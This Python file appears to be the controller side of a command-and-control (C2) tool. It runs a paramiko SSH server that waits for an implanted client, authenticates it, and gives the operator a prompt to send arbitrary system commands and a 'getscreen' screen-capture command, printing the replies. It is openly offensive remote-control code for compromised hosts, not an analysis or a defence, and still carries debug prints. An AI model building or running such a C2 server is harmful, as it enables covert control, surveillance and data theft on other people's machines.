import socket
import paramiko
import threading
import sys

C2_SERVER_ADDRESS = ''
C2_SERVER_PORT = 22
HOST_KEY = paramiko.RSAKey(filename='test_rsa.key')

SSH_USERNAME = ''
SSH_PASSWORD = ''


class SSHServer (paramiko.ServerInterface):

    def __init__(self):
        self.event = threading.Event()

    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self, username, password):
        if username == SSH_USERNAME and password == SSH_PASSWORD:
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED


def init():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((C2_SERVER_ADDRESS, C2_SERVER_PORT))
        sock.listen(100)
        print('[+] Listening for connections...')
        return sock
    except Exception as e:
        print('[-] Bind/Listen failed: ' + str(e))
        sys.exit(1)


def print_help():
    print('*************************')
    print('[*] Available Commands:')
    print('    <Unix/System cmd>')
    print('    getscreen')
    print('    quit')
    print('*************************')


def manage_communication(chan):
    while True:
        try:
            print('-------------------')
            cmd = input("[+] Enter command: ")
            print("Input cmd: ", cmd)
            #.strip('\n')
            if cmd == 'help':
                print_help()
                continue
            print("here")
            chan.send(cmd)
            print("here2")
            response = chan.recv(1024)
            print("here3")
            print('-------------------')
            print('[+] Response: ')
            print(response)
            if response == 'Goodbye':
                print('[+] Terminating')
                break
        except Exception as e:
            print('[-] Exception while parsing input: ' + str(e))


def manage_connection(client, addr):
    try:
        t = paramiko.Transport(client)
        t.load_server_moduli()
        t.add_server_key(HOST_KEY)
        server = SSHServer()
        t.start_server(server=server)
        chan = t.accept(20)
        print('[+] Client is authenticated!')
        print('[+] Msg from client: ' + chan.recv(1024))
        chan.send('You are now connected and authenticated')

        manage_communication(chan)

    except Exception as e:
        print('[-] Caught exception: ' + str(e))
        t.close()
        sys.exit(1)


def main():
    while True:
        try:
            sock = init()
            client, addr = sock.accept()
            print('[+] Got a connection from ' + str(addr))
        except Exception as e:
            print('[-] Accepting failed: ' + str(e))
            sys.exit(1)
        manage_connection(client, addr)


if __name__ == "__main__":
    main()
